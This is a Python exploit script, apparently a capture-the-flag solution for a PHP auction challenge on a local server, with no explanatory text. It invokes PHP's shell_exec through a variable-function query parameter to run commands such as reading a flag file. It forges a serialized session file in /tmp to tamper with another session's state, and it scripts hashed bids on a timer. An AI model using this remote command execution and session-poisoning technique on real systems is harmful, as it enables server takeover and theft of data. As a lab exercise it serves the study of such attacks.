import hashlib
import random
import re
import time
import urllib

import requests

url = 'http://localhost:8002'

s1 = requests.Session()
s2 = requests.Session()

home = s1.get(url).text
for i in home.split('\n'):
    if 'Your address: ' in i:
        my_address = re.search(r'>([\da-f]{32})<', i)[1]
print(f'{my_address=}')
start_time = time.time()

s2.get(url)
session_id = s2.cookies.get('PHPSESSID')
print(f'{session_id=}')

def get_info():
    # https://www.php.net/manual/en/functions.variable-functions.php
    # https://www.php.net/manual/en/function.serialize
    # cmd = 'ls'
    cmd = 'cat flag2023.php'
    cmd = f'(echo -n \'init_time|i:{int(start_time) + 200};height|i:0;wallet|a:0:{{}}items|s:101:"\' > /tmp/sess_{session_id}) && ({cmd} | tr \'\\n\' \' \' | sed -e :a -e \'s/^.\{{1,100\}}$/& /;ta\' >> /tmp/sess_{session_id}) && (echo -n \'";\' >> /tmp/sess_{session_id})'
    r = s1.get(url + '?info=shell_exec&shell_exec=' + urllib.parse.quote(cmd))
    print(r.text)
    info = r.json()
    return info['time'], info['items'], info['endgame']

def bid(amount, tx_fee=4, item=2):
    nouce = random.randbytes(16).hex()
    data = f'{my_address}{item:04x}{amount:04x}{tx_fee:04x}{nouce}'
    data += hashlib.sha256(data.encode()).digest().hex()
    assert s1.get(f'{url}?data={data}').text == '0'

def sleep_until(t):
    now = time.time() - start_time
    assert now < t
    time.sleep(t - now)

print(get_info())
bid(1, item=1)
for i in range(0, 180, 15):
    for j in range(5):
        bid(1 if i + j == 0 else 0)
    sleep_until(i + 15)
    print(get_info())

print(s2.get(url + '?info').text)
